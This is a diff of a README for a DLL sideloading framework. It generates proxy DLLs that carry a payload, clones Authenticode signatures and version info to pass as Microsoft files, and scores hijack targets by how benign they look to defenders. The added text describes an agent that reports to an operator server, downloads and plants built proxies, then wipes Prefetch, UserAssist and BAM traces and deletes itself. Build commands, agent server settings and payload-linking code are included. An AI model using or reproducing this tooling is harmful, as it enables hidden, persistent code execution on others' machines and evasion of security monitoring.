@@ -2,45 +2,150 @@
 
 ## Why DLL Sideloading?
 
-DLL sideloading lets your code — whether it's a game cheat, C2 agent, or red team implant — execute inside a legitimate, signed process. To a defender triaging alerts or reviewing logs, the running `.exe` looks completely benign: it's a trusted vendor binary with a valid signature. Your payload is just along for the ride as a DLL it was going to load anyway.
+DLL sideloading lets your code — whether it's a game cheat, loader, or custom tool — execute inside a legitimate, signed process. To anyone looking at the running `.exe`, it's a trusted vendor binary with a valid signature. Your payload is just along for the ride as a DLL it was going to load anyway.
 
 This framework automates the tedious part: analyzing the target DLL's exports, generating the proxy code that forwards every function call to the original, and giving you a clean slot for your payload. Pick a [hijackable DLL](https://hijacklibs.net), run one command, drop in your code, build.
 
 ---
 
-Generate proxy DLL projects for DLL sideloading and hijacking research. Point it at a DLL, get a ready-to-compile project that mirrors all exports and forwards them to the original — with a slot for your payload code.
+## Architecture
 
-## Workflow
-
-1. Pick a target DLL (e.g. from [hijacklibs.net](https://hijacklibs.net))
-2. Run the generator
-3. Edit `payload.c` with your loader code
-4. Build with MSVC or MinGW
-5. Deploy
+The framework has three layers that can be used independently or together:
 
 ```
+generate.py          Proxy DLL generator (core engine)
+scan.py              Target scanner — finds sideloadable EXE+DLL pairs on a system
+server/ + agent/     Deployment system — automates the full scan-build-deploy pipeline
+```
+
+### Deployment System
+
+The deployment system automates everything end-to-end. A Rust scanner runs on the target machine, reports sideloading opportunities to a backend server, an operator picks a target from the web dashboard, and the system handles the rest — upload, proxy build, deploy, and cleanup.
+
+```
+Target Machine                Backend Server              Dashboard
++--------------+             +------------------+        +----------+
+| agent.exe    |  --JSON-->  | FastAPI           |  <---  | Web UI   |
+| (1.8 MB Rust)|             |                  |        |          |
+|              |             | generate.py +     |        | Browse   |
+| - PE scanner |  <--DLL---  | MSVC/GCC compile |        | targets, |
+| - deployer   |             |                  |        | select   |
+| - cleanup    |             | auto-build proxy |        |          |
++--------------+             +------------------+        +----------+
+```
+
+**Flow:**
+
+1. Run `agent.exe` on target — scans installed software, finds sideloading targets
+2. Agent checks in with the backend, reports all targets
+3. Operator picks a target from the web dashboard (e.g. `Discord.exe + dbghelp.dll`)
+4. Agent uploads the original DLL to the backend
+5. Backend auto-builds a proxy DLL (generate.py + compiler)
+6. Agent downloads and deploys the proxy (replace or search-order plant)
+7. Agent erases all traces and self-deletes from disk
+8. Next time the legitimate EXE starts, the proxy loads — exports work normally, payload fires
+
+The agent can be stopped and restarted between steps. Tasks persist on the server — the agent picks up where it left off on the next check-in.
+
+## Quick Start
+
+### Manual mode (single DLL)
+
+```
+pip install -r requirements.txt
 python generate.py C:\Windows\System32\version.dll --payload --embed --block
+cd output\version_proxy
+# edit payload.c
+mingw32-make       # or build_msvc.bat
+```
+
+### Deployment system
+
+```bash
+# 1. Start the backend
+cd server
+pip install -r requirements.txt
+python app.py                          # runs on :8443
+
+# 2. Build and run the scanner on the target
+cd agent
+cargo build --release
+# copy target/release/agent.exe to target machine, run it
+
+# 3. Open http://localhost:8443 — pick a target, click Select
+# Everything else is automatic.
 ```
 
 ## Features
 
 - **Export mirroring** — Analyzes PE export table and generates assembly trampolines (`jmp [ptr]`) that transparently forward all calls to the original DLL. Handles named exports, ordinal-only exports, forwarded exports, and C++ mangled names.
-- **Embed mode** (`--embed`) — Bakes the original DLL as a PE resource. At load time it extracts to `%TEMP%` and loads it. No need to ship a second DLL file.
+- **Embed mode** (`--embed`) — Bakes the original DLL as a PE resource. At load time it extracts to `%TEMP%` and loads it. Single-file deployment.
 - **Payload thread** (`--payload`) — Generates a `payload.c` template. Your code runs in a separate thread after all exports are resolved.
-- **Block mode** (`--block`) — Suspends the main thread so the process can't exit before your payload finishes. Uses a two-layer approach: primary suspend + atexit fallback. No loader lock issues.
-- **MetaTwin cloning** — Automatically clones PE version info (CompanyName, FileDescription, FileVersion, etc.) and Authenticode signature from the source DLL. The proxy looks identical to the original in file properties and shows the original signer in signature dialogs.
-- **Dual compiler support** — Generates both MSVC (`.asm` + `build_msvc.bat`) and MinGW (`.S` + `Makefile`) build files.
+- **Block mode** (`--block`) — Suspends the main thread so the process can't exit before your payload finishes. Two-layer approach: primary suspend + atexit fallback. Deadlock-free.
+- **MetaTwin cloning** — Clones PE version info and Authenticode signature from the source DLL. The proxy looks identical in file properties.
+- **Dual compiler support** — MSVC (`.asm` + `build_msvc.bat`) and MinGW (`.S` + `Makefile`).
 - **Both architectures** — x86 and x64, auto-detected from the input DLL.
+- **Automated scanning** — Rust-based scanner finds sideloading targets by parsing PE import tables across the entire filesystem.
+- **Deployment server** — FastAPI backend with web dashboard. Auto-builds proxy DLLs from uploaded originals.
+- **Post-deploy cleanup** — Agent erases its files, clears execution traces (Prefetch, UserAssist, BAM), and self-deletes from disk using NTFS data stream rename.
 
-## Installation
+## Scanner
+
+The scanner finds sideloading targets on the local system. It walks the filesystem, parses PE import tables, and catalogs every EXE+DLL pair usable for deployment.
+
+**Vectors detected:**
+
+| Vector | Description |
+|--------|-------------|
+| **Replace** | DLL already beside the EXE — copy both, swap DLL with proxy |
+| **Search-order** | DLL in System32 but not in app dir — place proxy in app dir, it loads first |
+| **Phantom** | DLL imported (delayed) but missing — any DLL with that name gets loaded |
+
+**Scoring** prioritizes legitimacy (how normal it looks to a defender):
+
+| Factor | Score |
+|--------|-------|
+| Host EXE is signed | +4 |
+| Replace vector (proven — app already loads from here) | +3 |
+| Search-order vector | +2 |
+| Stealth DLL name (version.dll, dbghelp.dll, etc.) | +2 |
+| Zero companion DLLs (clean 2-file package) | +2 |
+| Delayed import (safer, loads on demand) | +1 |
+
+**Filters out:** KnownDLLs (registry), API sets (`api-ms-*`), `ntdll.dll` (kernel-loaded), phantom static imports (EXE can't start without them).
+
+### Standalone usage
 
 ```
-pip install -r requirements.txt
+python scan.py                                    # scan all drives
+python scan.py C:\Users --signed-only --top 20    # signed EXEs, top 20
+python scan.py --max-companions 0                 # only clean 2-file packages
+python scan.py --vector replace                   # only replace-vector targets
+python scan.py -o targets.json                    # save for package.py
 ```
 
-Requires Python 3.10+ and either Visual Studio (MSVC) or MinGW-w64 for building.
+### Scanner options
 
-## Usage
+```
+positional:
+  paths                          Directories to scan (default: all drives)
+
+options:
+  -t, --threads N                Worker threads (default: 8)
+  --signed-only                  Only report signed host EXEs
+  --skip-windows                 Skip C:\Windows tree (faster)
+  --min-score N                  Minimum score threshold
+  --vector {replace,search_order,phantom}  Filter by vector type
+  --max-companions N             Max companion DLLs (0 = clean packages only)
+  --top N                        Show top N results
+  -o, --output FILE              Save JSON for package.py
+  --json                         JSON to stdout
+  -q, --quiet                    No progress output
+```
+
+## Proxy Generator
+
+### Usage
 
 ```
 python generate.py <dll_path> [options]
@@ -57,54 +162,23 @@ Options:
   --dry-run                    Show what would be generated without writing
 ```
 
-### Examples
-
-Minimal proxy (no payload, load original from disk):
-```
-python generate.py C:\Windows\System32\version.dll
-```
-
-Full sideloading setup with embedded DLL and blocking payload:
-```
-python generate.py C:\Windows\System32\version.dll --payload --embed --block
-```
-
-MSVC-only, verbose:
-```
-python generate.py C:\Windows\System32\dbghelp.dll --payload --compiler msvc -v
-```
-
-## Generated Project Structure
+### Generated project structure
 
 ```
 version_proxy/
-├── proxy.c              # DllMain, function pointer table, init/cleanup
-├── proxy.h              # Exported function pointer declarations
-├── exports.def          # Module definition file (maps exports to trampolines)
-├── trampolines.asm      # MSVC MASM — one jmp [ptr] per export
-├── trampolines.S        # MinGW GAS — same, AT&T/Intel syntax
-├── payload.c            # Your code goes here
-├── payload.h            # Payload thread declaration
-├── resource.rc          # Version info + embedded DLL resource
-├── resource.h           # Resource IDs
-├── original_version.dll # Copy of original DLL
-├── sigclone.py          # Post-build signature cloner (auto-run)
-├── build_msvc.bat       # Build with cl.exe + ml64.exe
-└── Makefile             # Build with gcc + as
-```
-
-## Building
-
-**MSVC** — open a Developer Command Prompt:
-```
-cd output\version_proxy
-build_msvc.bat
-```
-
-**MinGW**:
-```
-cd output\version_proxy
-mingw32-make
++-- proxy.c              # DllMain, function pointer table, init/cleanup
++-- proxy.h              # Exported function pointer declarations
++-- exports.def          # Module definition file (maps exports to trampolines)
++-- trampolines.asm      # MSVC MASM — one jmp [ptr] per export
++-- trampolines.S        # MinGW GAS — same, AT&T/Intel syntax
++-- payload.c            # Your code goes here
++-- payload.h            # Payload thread declaration
++-- resource.rc          # Version info + embedded DLL resource
++-- resource.h           # Resource IDs
++-- original_version.dll # Copy of original DLL
++-- sigclone.py          # Post-build signature cloner (auto-run)
++-- build_msvc.bat       # Build with cl.exe + ml64.exe
++-- Makefile             # Build with gcc + as
 ```
 
 ## How It Works
@@ -129,138 +203,127 @@ At `DLL_PROCESS_ATTACH`, the original DLL is loaded and all function pointers ar
 
 ### Block Mode
 
-When the host process would exit immediately (e.g. printing `--help`), `--block` keeps it alive:
+When the host process would exit immediately, `--block` keeps it alive:
 
-1. **Primary**: The payload thread suspends the main thread (after loader lock releases). Main is frozen before it can reach `main()` or `ExitProcess`. Payload runs, then calls `ExitProcess(0)`.
-2. **Fallback**: If main wins the race, `atexit` handler blocks until the payload signals completion.
+1. **Primary**: The payload thread suspends the main thread (after loader lock releases). Payload runs, then calls `ExitProcess(0)`.
+2. **Fallback**: If main exits first, `atexit` handler blocks until the payload signals completion.
 
 Both paths are deadlock-free — no loader lock involvement.
-
-## Testing
-
-A test suite verifies all mode combinations against `version.dll` for both compilers. Requires a Developer Command Prompt (MSVC). GCC tests run automatically if `gcc` and `mingw32-make` are on PATH.
-
-```
-cd test
-run_tests.bat
-```
-
-This generates proxies, builds them, and runs a test host (`test_host.c`) that loads the proxy DLL, calls `GetFileVersionInfoSizeA`, and exits immediately. The tests verify:
-
-| Test | Compiler | Mode | Verifies |
-|------|----------|------|----------|
-| 1 | MSVC | `--embed --payload` | Embedded DLL extraction + export forwarding |
-| 2 | MSVC | `--embed --payload --block` | Block mode keeps process alive, payload completes |
-| 3 | MSVC | `--payload` | Side-by-side DLL loading + export forwarding |
-| 4 | MSVC | `--payload --block` | Block mode without embedding |
-| 5 | GCC | `--embed --payload` | GCC embedded DLL extraction + forwarding |
-| 6 | GCC | `--embed --payload --block` | GCC block mode with embedding |
-| 7 | GCC | `--payload` | GCC side-by-side loading + forwarding |
-| 8 | GCC | `--payload --block` | GCC block mode without embedding |
-| 9 | MSVC | `--embed --payload --block` | MetaTwin: version info + signature cloned correctly |
-| 10 | GCC | `--embed --payload --block` | MetaTwin: version info + signature cloned correctly |
-
-Expected output:
-```
-============================================================
- DLL Proxy Framework - Test Suite
-============================================================
-
-[*] Compiling test host...
-[+] test_host.exe ready
-
-[*] MinGW detected - GCC tests enabled
-
-[TEST 1/MSVC] --embed --payload
-------------------------------------------------------------
-[+] PASS: MSVC embed forwarding works
-...
-[TEST 9/META] MSVC --embed --payload --block (metadata + signature)
-------------------------------------------------------------
-[+] PASS: MSVC embed + block + metatwin
-
-[TEST 10/META] GCC --embed --payload --block (metadata + signature)
-------------------------------------------------------------
-[+] PASS: GCC embed + block + metatwin
-
-============================================================
- Results: 10 passed, 0 failed
-============================================================
-```
 
 ### MetaTwin (Metadata + Signature Cloning)
 
 The framework automatically clones the source DLL's identity onto the proxy:
 
-1. **Version info** — CompanyName, FileDescription, FileVersion, ProductName, Copyright, etc. are extracted during analysis and compiled into the proxy via `resource.rc`. The proxy's file properties look identical to the original.
+1. **Version info** — CompanyName, FileDescription, FileVersion, etc. are compiled into `resource.rc`. The proxy's file properties look identical.
+2. **Authenticode signature** — `sigclone.py` copies the signature. Shows the original signer but reports `HashMismatch` under full validation.
 
-2. **Authenticode signature** — After the build, `sigclone.py` copies the source DLL's Authenticode signature onto the proxy. The signature shows the original signer (e.g. "Microsoft Windows") but will report `HashMismatch` under full validation since the binary content differs. Tools that only check for signature presence or display the signer name without validating the hash will show the proxy as signed by the original vendor.
-
-Both steps are automatic — no flags needed. If the source DLL has version info, it's cloned. If it's signed, the signature is cloned as a post-build step.
+Both are automatic — no flags needed.
 
 ```
 Original:  Valid    | CN=Microsoft Windows, O=Microsoft Corporation
 Proxy:     HashMismatch | CN=Microsoft Windows, O=Microsoft Corporation
 ```
 
-## Example: Linking a Rust Cheat / Implant
+### Agent Cleanup
 
-If you already have a project written in Rust (a cheat, agent, implant, etc.), you can statically link it into the proxy DLL. The result is a single `.dll` file — your Rust code runs inside the hijacked process with no extra files dropped to disk.
+After deploying the proxy DLL, the agent erases its traces:
 
-### 1. Compile your Rust project as a static library
+| What | How | Privileges |
+|------|-----|-----------|
+| Client ID file | Overwrite with zeros, delete | User |
+| Temp scanner artifacts | Delete `.~scan*`, `proxy_fw/` | User |
+| `.bak` backup of replaced DLL | Delete (proxy embeds original) | User |
+| Prefetch entries | Delete `C:\Windows\Prefetch\<exe>-*.pf` | Admin |
+| UserAssist history | Remove ROT13-encoded entry from HKCU | User |
+| BAM/DAM entries | Remove from `HKLM\..\bam\State\` | Admin |
+| Agent binary | NTFS data stream rename + FileDispositionInfoEx | User |
 
-In your Rust project's `Cargo.toml`, set the crate type to `staticlib`:
+The self-delete uses the NTFS data stream technique: renames `:$DATA` to an alternate stream, then marks the file for deletion via `FileDispositionInfoEx` with POSIX semantics. The binary disappears from disk while the process is still running. Falls back to `cmd.exe` delayed delete on older Windows.
+
+## Deployment Server
+
+### API Endpoints
+
+**Client API** (called by agent):
+```
+POST /api/checkin          Check-in with scan results, receive pending tasks
+POST /api/upload           Upload original DLL for proxy build
+GET  /api/download/{id}    Download compiled proxy DLL
+POST /api/deployed         Confirm successful deployment
+```
+
+**Dashboard API** (called by web UI):
+```
+GET  /api/clients          List connected clients
+GET  /api/clients/{id}     Client detail + targets + builds
+POST /api/select           Select target — queues upload task for client
+```
+
+**Web UI**: `GET /` serves the operator dashboard at `http://localhost:8443`.
+
+### Agent Configuration
+
+Edit constants at the top of `agent/src/main.rs`:
+
+```rust
+const SERVER_URL: &str = "http://127.0.0.1:8443";
+const CHECKIN_INTERVAL: Duration = Duration::from_secs(30);
+const SCAN_PATHS: &[&str] = &["C:\\"];
+```
+
+## Testing
+
+### Unit tests
+
+```
+cd test
+run_tests.bat
+```
+
+10 test cases covering MSVC + GCC, embed/non-embed, block/non-block, and MetaTwin.
+
+### End-to-end smoketest
+
+The `test/smoketest/` directory contains a minimal victim setup (`victim.exe` + `helper.dll`) for verifying the full deployment pipeline. Verified 7/7:
+
+| Check | Result |
+|-------|--------|
+| Build status = deployed | PASS |
+| DLL replaced (42K -> 130K, different hash) | PASS |
+| Export forwarding (helper_greet=42, helper_add=17) | PASS |
+| Payload execution (proof.txt created) | PASS |
+| Agent binary self-deleted from disk | PASS |
+| Client ID file cleaned | PASS |
+| Backup file removed | PASS |
+
+## Example: Linking a Rust Cheat
+
+If you have a Rust project (cheat, loader, etc.), you can statically link it into the proxy DLL.
+
+### 1. Compile as static library
 
 ```toml
 [lib]
 crate-type = ["staticlib"]
 ```
 
-Expose an entry point with C linkage:
-
 ```rust
-// src/lib.rs
-use std::fs;
-use std::io::Write;
-
 #[unsafe(no_mangle)]
 pub extern "C" fn cheat_main() {
-    // your cheat / implant / agent logic here
-    // this runs in its own thread inside the hijacked process
-
-    let pid = std::process::id();
-    let msg = format!("Cheat running in PID {}\n", pid);
-    if let Ok(mut f) = fs::File::create("proof.txt") {
-        let _ = f.write_all(msg.as_bytes());
-    }
+    // runs in its own thread inside the hijacked process
 }
 ```
 
-> Note: Rust 2024 edition requires `#[unsafe(no_mangle)]`. For older editions use `#[no_mangle]`.
-
-Build it:
-
-```
-cargo build --release
-```
-
-This produces `target\release\your_crate.lib`.
-
-### 2. Generate the proxy project
+### 2. Generate proxy + edit payload
 
 ```
 python generate.py C:\Windows\System32\version.dll --payload --embed --block
 ```
 
-### 3. Edit `payload.c` to call your Rust code
-
-Replace the generated `payload.c` with:
-
 ```c
+// payload.c
 #include "payload.h"
-
 extern void cheat_main(void);
-
 DWORD WINAPI payload_main(LPVOID lpParam) {
     (void)lpParam;
     cheat_main();
@@ -268,122 +331,50 @@ DWORD WINAPI payload_main(LPVOID lpParam) {
 }
 ```
 
-### 4. Link the Rust `.lib` into the build
+### 3. Link and build
 
-**MSVC** — edit `build_msvc.bat`, add the `.lib` and its dependencies to the link line:
+Add the `.lib` to the link line in `build_msvc.bat` or `Makefile`, plus Rust stdlib dependencies (`ws2_32`, `advapi32`, `userenv`, `bcrypt`, etc.).
 
-```bat
-cl /nologo /LD ^
-    proxy.c payload.c trampolines.obj resource.res ^
-    /link /DEF:exports.def /OUT:version.dll ^
-    C:\path\to\your_crate.lib ^
-    kernel32.lib user32.lib ws2_32.lib advapi32.lib userenv.lib ^
-    ntdll.lib bcrypt.lib msvcrt.lib
-```
-
-> The extra system libs (`ws2_32`, `advapi32`, `userenv`, `bcrypt`, etc.) are pulled in by the Rust standard library. If you get unresolved symbols at link time, add the missing lib — the linker error will tell you which one.
-
-**MinGW** — edit the `Makefile`:
-
-```makefile
-RUSTLIB = /path/to/your_crate.lib
-
-$(TARGET): $(OBJECTS)
-    $(CC) $(CFLAGS) -o $@ $^ $(DEF) $(RUSTLIB) -lkernel32 -luser32 -lws2_32 -ladvapi32 -luserenv -lbcrypt -lntdll
-```
-
-### 5. Build and deploy
-
-```
-build_msvc.bat
-```
-
-The output `version.dll` is a single file containing:
-- The proxy export table (forwards all calls to the embedded original)
-- The embedded original `version.dll` (extracted at runtime)
-- Your entire Rust cheat, statically linked in
-
-Drop it next to the target `.exe`. When the process starts, it loads your proxy as `version.dll`, all API calls work normally, and your Rust code runs in a separate thread — inside a legitimate signed process.
-
-### Deployment layout
+### Result
 
 ```
 target_app/
-├── legit_signed_app.exe     # Trusted binary that loads version.dll
-└── version.dll              # Your proxy (contains original + your Rust code)
++-- legit_signed_app.exe     # Trusted vendor binary
++-- version.dll              # Proxy (embedded original + your Rust code)
 ```
 
-That's it. One file. The `.exe` in the logs is a signed vendor binary.
+One file. The `.exe` in the logs is a signed vendor binary.
 
-## DLL Hijack Scanner
-
-The built-in scanner finds sideloading targets automatically. It walks the filesystem, parses PE import tables, and reports executables that load DLLs vulnerable to hijacking.
-
-**What it detects:**
-
-- **Phantom DLLs** — imported but don't exist anywhere on disk. Drop any DLL with that name and it loads.
-- **Search-order hijack** — DLL exists in System32 but not in the app's directory, and the app directory is writable. Plant a proxy there and it loads before the real one.
-
-Both static and delayed imports are checked. Results are scored by exploitability (phantom > search-order, signed > unsigned, user-writable > protected, delayed > static).
+## Project Structure
 
 ```
-python scan.py                                        # scan all drives
-python scan.py C:\Users D:\Apps                       # scan specific paths
-python scan.py --signed-only --skip-windows           # signed EXEs only, skip C:\Windows
-python scan.py --json -o results.json                 # JSON output + save to file
-python scan.py --generate                             # auto-generate proxy projects for findings
-python scan.py --generate --generate-compiler msvc    # generate MSVC-only projects
-```
-
-### Scanner options
-
-```
-positional:
-  paths                          Directories to scan (default: all drives)
-
-options:
-  -t, --threads N                Worker threads (default: 8)
-  --signed-only                  Only report signed host EXEs
-  --skip-windows                 Skip C:\Windows tree (faster)
-  -o, --output FILE              Save JSON results to file
-  --json                         Print JSON to stdout
-  -q, --quiet                    No progress output
-  --generate                     Auto-generate proxy projects for search-order hits
-  --generate-compiler {msvc,gcc,both}  Compiler for generated projects (default: both)
-  --generate-output DIR          Output root for generated projects (default: ./output/scan/)
-```
-
-### Score system
-
-Each finding gets a priority score (higher = better target):
-
-| Factor | Score |
-|--------|-------|
-| Phantom DLL | +3 |
-| Search-order hijack | +1 |
-| Host EXE is signed | +2 |
-| Delayed import | +1 |
-| User-writable path (AppData, Users, Temp) | +1 |
-
-### Pipeline: scan + generate
-
-Scan a system, then auto-generate proxy projects for every finding that has a known source DLL:
-
-```
-python scan.py C:\Users --signed-only --generate --generate-compiler msvc
-```
-
-This runs the scanner, then invokes `generate.py` for each unique (source DLL, architecture) pair with `--payload --embed --block`. Output lands in `./output/scan/`.
-
-## Non-Embed Mode
-
-Without `--embed`, the proxy loads the original DLL from disk at runtime. Rename the original and place it alongside the proxy:
-
-```
-target_app/
-├── version.dll              # Your proxy
-├── original_version.dll     # The real DLL (renamed)
-└── app.exe                  # Host application
+DLLProxyFramework/
++-- generate.py              # Proxy DLL generator (CLI)
++-- scan.py                  # Standalone target scanner (CLI)
++-- package.py               # Offline package builder (CLI)
++-- requirements.txt         # Python dependencies
++-- analyzer/                # PE analysis module
+|   +-- pe_analyzer.py       # Export table, version info, signature detection
++-- generator/               # Code generation module
+|   +-- codegen.py           # Template orchestrator
+|   +-- template_engine.py   # Jinja2 wrapper
+|   +-- templates/           # 13 Jinja2 templates (C, ASM, BAT, Makefile, RC)
++-- embedder/                # DLL resource embedding
++-- sigclone/                # Authenticode signature cloner
++-- scanner/                 # Python scanner module (used by scan.py)
+|   +-- dll_scanner.py       # PE scanning, scoring, target catalog
++-- server/                  # Deployment backend
+|   +-- app.py               # FastAPI application
+|   +-- models.py            # Data store (agents, targets, builds, tasks)
+|   +-- builder.py           # Auto-build pipeline (generate + compile)
+|   +-- static/index.html    # Operator web dashboard
++-- agent/                   # Rust scanner + deployer
+|   +-- src/main.rs          # Check-in loop, upload, deploy
+|   +-- src/scanner.rs       # PE scanning (pelite), scoring
+|   +-- src/cleanup.rs       # Trace removal, NTFS self-delete
++-- test/
+    +-- run_tests.bat        # 10-case test suite
+    +-- smoketest/            # E2E smoketest (victim.exe + helper.dll)
 ```
 
 ## License
